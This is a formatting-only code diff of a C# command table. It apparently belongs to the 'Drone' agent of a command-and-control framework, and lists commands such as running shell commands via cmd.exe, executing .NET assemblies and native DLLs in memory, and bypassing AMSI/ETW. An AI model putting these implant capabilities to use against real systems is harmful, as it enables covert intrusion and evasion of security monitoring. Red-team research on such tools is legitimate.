@@ -25,12 +25,12 @@ namespace Drone
 
         public override List<Command> Commands => new List<Command>
         {
-            new ("pwd", "Print working directory", GetCurrentDirectory),
-            new ("cd", "Change working directory", ChangeCurrentDirectory, new List<Command.Argument>
+            new("pwd", "Print working directory", GetCurrentDirectory),
+            new("cd", "Change working directory", ChangeCurrentDirectory, new List<Command.Argument>
             {
                 new("path")
             }),
-            new ("ls", "List filesystem", GetDirectoryListing, new List<Command.Argument>
+            new("ls", "List filesystem", GetDirectoryListing, new List<Command.Argument>
             {
                 new("path")
             }),
@@ -56,8 +56,8 @@ namespace Drone
                 new("/path/to/file.txt")
             }),
             new("ps", "List running processes", GetProcessListing),
-            new ("getuid", "Get current identity", GetCurrentIdentity),
-            new ("shell", "Run a command via cmd.exe", ExecuteShellCommand, new List<Command.Argument>
+            new("getuid", "Get current identity", GetCurrentIdentity),
+            new("shell", "Run a command via cmd.exe", ExecuteShellCommand, new List<Command.Argument>
             {
                 new("args", false)
             }),
@@ -68,15 +68,15 @@ namespace Drone
             new ("execute-assembly", "Execute a .NET assembly", ExecuteAssembly, new List<Command.Argument>
             {
                 new("/path/to/assembly.exe", false, true),
-                new ("args")
+                new("args")
             }),
-            new ("overload", "Map and execute a native DLL", OverloadNativeDll, new List<Command.Argument>
+            new("overload", "Map and execute a native DLL", OverloadNativeDll, new List<Command.Argument>
             {
                 new("/path/to/file.dll", false, true),
                 new("export-name", false),
                 new("args")
             }),
-            new ("bypass", "Set a directive to bypass AMSI/ETW on tasks", SetBypass, new List<Command.Argument>
+            new("bypass", "Set a directive to bypass AMSI/ETW on tasks", SetBypass, new List<Command.Argument>
             {
                 new("amsi/etw", false),
                 new("true/false")
